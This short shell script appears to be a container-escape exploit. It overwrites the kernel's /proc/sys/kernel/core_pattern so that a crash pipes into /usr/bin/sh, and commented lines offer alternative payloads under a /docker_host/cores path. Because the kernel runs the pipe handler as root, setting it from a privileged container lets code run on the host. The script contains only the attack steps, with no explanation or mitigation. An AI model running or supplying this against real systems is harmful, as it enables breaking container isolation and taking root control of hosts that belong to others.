path=/proc/sys/kernel/core_pattern
echo "current core pattern is"
cat $path
#echo "|/usr/bin/python /docker_host/cores/1.py" > $path
#echo "|/docker_host/cores/a.out" > $path
echo "|/usr/bin/sh" > $path
echo "current core pattern is"
cat $path